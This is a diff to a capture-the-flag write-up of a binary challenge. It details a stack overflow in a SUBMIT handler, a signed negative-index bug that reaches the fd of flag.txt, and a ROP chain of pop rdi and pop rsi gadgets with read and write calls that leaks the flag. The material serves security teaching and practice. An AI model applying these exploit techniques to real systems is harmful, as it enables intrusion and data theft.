@@ -27,7 +27,7 @@ Front desk commands: `NOTE <0..7> <text>` (table at `0x40a180`, each entry 0x40,
 
 AF_UNIX `SOCK_STREAM` is a plain byte stream that keeps no record boundaries, so `read(3, buf, n)` picks up both the header and the payload of the reply.
 
-## Two vulnerabilities
+## Vulnerabilities
 
 **1. Stack overflow at the front desk (`0x401ed0`, the `SUBMIT` handler)**
 
@@ -37,26 +37,19 @@ if (bl) { write(1,"GO\n",3); read(0, rsp, bl); write(1,"OK\n",3); }
 add rsp,0x40; pop rbx; ret
 ```
 
-The frame `sub rsp,0x40` = 64 bytes, the return address sits at offset 0x48, `read` takes up to 255 bytes, no canary.
+The frame `sub rsp,0x40` = 64 bytes, the return address sits at offset 0x48, `read` takes up to 255 bytes, no canary. The ROP chain requires `pop rdx`, but `.text` only contains `pop rdi` and `pop rsi`. There is no `pop rdx`, `syscall`, or stack-pivot gadget. NX and GNU_RELRO are enabled, preventing shellcode execution and GOT overwrites.
 
 **2. Negative index in the vault (`0x4019c0`, op 3)**
 
 ```
 if (len <= 3) -> "short"
-idx = *(int32*)data            // movsxd, CÓ DẤU
-if (idx > 15) -> "range"       // chỉ chặn cận trên
+idx = *(int32*)data            // movsxd, SIGNED
+if (idx > 15) -> "range"       // upper bound check only
 e = 0x4060b0 + idx*0x40c
-if (e.state == 2) { pread(e.fd, buf, 0x400, 0); trả kết quả về fd 3 }
+if (e.state == 2) { pread(e.fd, buf, 0x400, 0); return to fd 3 }
 ```
 
-`0x4060b0` is exactly the 4th entry of the fd table, so `idx = -4` points precisely at `0x405080` = the fd of `flag.txt`.
-
-## Approaches Ruled Out
-
-1. Put code on the stack and jump into it. NX is on.
-2. Overwrite the GOT to redirect a call. GNU_RELRO in this binary covers all of `.got`, no slot is writable.
-3. The ROP chain needs `pop rdx`. Sweeping all of `.text` only yields `pop rdi; ret @ 0x401529` and `pop rsi; ret @ 0x401e5f`; no `pop rdx`, no `syscall`, no `jmp/call rsp`.
-4. `rdx` on return from SUBMIT equals `size`. It does not. The `write(1,"OK\n",3)` instruction runs *after* `read` and leaves `edx = 3`. Evidence: the first three runs extracted only 3 bytes per round, and the `op=3` request (which requires `len > 3`) was always answered `"short"` by the vault. `rdx` has to be set somewhere else.
+`0x4060b0` is exactly the 4th entry of the fd table, so `idx = -4` points precisely at `0x405080` = the fd of `flag.txt`. To leak the flag, `rdx` (length parameter) needs to be controlled during the ROP chain execution.
 
 ## Exploit Chain
 
@@ -71,7 +64,7 @@ pad(0x48)
 pop rdi -> NOTE3("256") ; 0x401ed0                 # rdx = 13
 [vòng đầu] pop rdi=3 ; pop rsi=NOTE0 ; 0x401d50    # gửi op=3, len=13, data=int32(-4)
 pop rdi=3 ; pop rsi=REPLY ; read@plt               # read(3, REPLY, 13)
-pop rdi=1 ; pop rsi=REPLY ; write@plt              # write(1, REPLY, 13) -> dump ra socket của ta
+pop rdi=1 ; pop rsi=REPLY ; write@plt              # write(1, REPLY, 13) -> dump out to our socket
 0x4014d0                                           # quay lại prompt
 ```
 
